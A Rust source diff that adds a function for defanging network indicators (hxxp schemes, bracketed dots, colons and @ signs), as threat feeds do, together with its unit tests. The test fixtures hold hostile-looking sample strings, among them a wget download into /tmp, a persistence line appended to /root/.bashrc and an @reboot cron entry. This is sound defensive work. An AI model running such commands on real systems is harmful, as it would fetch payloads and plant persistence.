@@ -309,6 +309,88 @@ impl Collector {
     }
 }
 
+/// `text` made safe to paste and impossible to follow by accident, the convention threat feeds
+/// use: the `http`, `https`, `ftp` and `tftp` schemes become `hxxp`, `hxxps`, `fxp` and `tfxp`;
+/// the dots of a host name or IPv4 address become `[.]`; the colons of an IPv6 address become
+/// `[:]`; and the `@` of an email address or of user information before a host becomes `[@]`.
+/// Paths, commands and other words are left as they are, so a persistence line stays readable.
+/// Pure text: nothing is resolved or looked up.
+pub fn defang(text: &str) -> String {
+    let is_separator = |c: char| c.is_whitespace() || "'\"`;|&(),=".contains(c);
+    let mut out = String::with_capacity(text.len() + 16);
+    let mut rest = text;
+    while !rest.is_empty() {
+        let sep = rest.find(|c: char| !is_separator(c)).unwrap_or(rest.len());
+        out.push_str(&rest[..sep]);
+        rest = &rest[sep..];
+        let word = rest.find(is_separator).unwrap_or(rest.len());
+        out.push_str(&defang_word(&rest[..word]));
+        rest = &rest[word..];
+    }
+    out
+}
+
+fn defang_dots(host: &str) -> String {
+    host.replace('.', "[.]")
+}
+
+/// A host with an optional port: an IPv4 address or a named host gets its dots bracketed, a
+/// bracketed IPv6 address its colons. `None` when it is neither.
+fn defang_host_port(s: &str) -> Option<String> {
+    if let Some(inner) = s.strip_prefix('[') {
+        let (addr, tail) = inner.split_once(']')?;
+        addr.parse::<std::net::Ipv6Addr>().ok()?;
+        return Some(format!("[{}]{tail}", addr.replace(':', "[:]")));
+    }
+    let (host, port) = match s.rsplit_once(':') {
+        Some((h, p)) if !p.is_empty() && p.chars().all(|c| c.is_ascii_digit()) => (h, Some(p)),
+        _ => (s, None),
+    };
+    if host.parse::<Ipv4Addr>().is_ok() || is_named_host(host) {
+        return Some(match port {
+            Some(p) => format!("{}:{p}", defang_dots(host)),
+            None => defang_dots(host),
+        });
+    }
+    None
+}
+
+fn defang_word(word: &str) -> String {
+    if let Some((scheme, rest)) = word.split_once("://") {
+        let scheme = match scheme.to_ascii_lowercase().as_str() {
+            "http" => "hxxp".to_string(),
+            "https" => "hxxps".to_string(),
+            "ftp" => "fxp".to_string(),
+            "tftp" => "tfxp".to_string(),
+            _ => scheme.to_string(),
+        };
+        let end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
+        let (authority, path) = rest.split_at(end);
+        let authority = match authority.rsplit_once('@') {
+            Some((user, host)) => format!(
+                "{user}[@]{}",
+                defang_host_port(host).unwrap_or_else(|| host.to_string())
+            ),
+            None => defang_host_port(authority).unwrap_or_else(|| authority.to_string()),
+        };
+        return format!("{scheme}://{authority}{path}");
+    }
+    if word.parse::<std::net::Ipv6Addr>().is_ok() {
+        return word.replace(':', "[:]");
+    }
+    if let Some(host) = defang_host_port(word) {
+        return host;
+    }
+    if let Some((user, host)) = word.rsplit_once('@')
+        && !user.is_empty()
+        && !user.contains('/')
+        && let Some(host) = defang_host_port(host)
+    {
+        return format!("{user}[@]{host}");
+    }
+    word.to_string()
+}
+
 /// The text that stands in for a removed secret.
 const REDACTED: &str = "<redacted>";
 
@@ -1539,6 +1621,60 @@ Jx4u80n/q0WquQbw1QIDAQAB
             .map(|i| i.value.as_str())
             .collect();
         assert!(hosts.is_empty(), "{hosts:?}");
+    }
+
+    #[test]
+    fn defang_brackets_addresses_hosts_urls_and_emails() {
+        for (input, expected) in [
+            ("192.0.2.44", "192[.]0[.]2[.]44"),
+            ("192.0.2.44:6667", "192[.]0[.]2[.]44:6667"),
+            ("2001:db8::7", "2001[:]db8[:][:]7"),
+            ("[2001:db8::7]:22", "[2001[:]db8[:][:]7]:22"),
+            (
+                "http://198.51.100.7:8080/bins/x86?a=1",
+                "hxxp://198[.]51[.]100[.]7:8080/bins/x86?a=1",
+            ),
+            (
+                "https://evil.example.net/i",
+                "hxxps://evil[.]example[.]net/i",
+            ),
+            ("tftp://198.51.100.7/x86", "tfxp://198[.]51[.]100[.]7/x86"),
+            ("ftp://[2001:db8::2]/f", "fxp://[2001[:]db8[:][:]2]/f"),
+            (
+                "http://<redacted>@203.0.113.1/x",
+                "hxxp://<redacted>[@]203[.]0[.]113[.]1/x",
+            ),
+            (
+                "gw.proxyfixture.example:8000",
+                "gw[.]proxyfixture[.]example:8000",
+            ),
+            ("irc.example.org", "irc[.]example[.]org"),
+            ("ops@mail.example.com", "ops[@]mail[.]example[.]com"),
+            (
+                "127.0.0.1 rival.example.net",
+                "127[.]0[.]0[.]1 rival[.]example[.]net",
+            ),
+        ] {
+            assert_eq!(defang(input), expected, "{input}");
+        }
+        // Commands, paths, unit and file names, keys and markers stay readable.
+        for unchanged in [
+            "@reboot /var/tmp/w.sh",
+            "ExecStart=/home/developer/.config/netai -c conf",
+            "unit watcher-netai.service",
+            "echo '/var/tmp/%s &' >> /root/.bashrc",
+            "SHA256:pJJ5O45oiDv8biQy+j5TSe6JfzJ0daZcA7SkbNOEApA",
+            "sha512-crypt sha256:0123456789abcdef",
+            "#fixturechan",
+            "CONNECT %s:%d HTTP/1.1",
+        ] {
+            assert_eq!(defang(unchanged), unchanged);
+        }
+        // A word inside a command is defanged where it stands.
+        assert_eq!(
+            defang("cd /tmp; wget http://198.51.100.7/i -O i"),
+            "cd /tmp; wget hxxp://198[.]51[.]100[.]7/i -O i"
+        );
     }
 
     #[test]
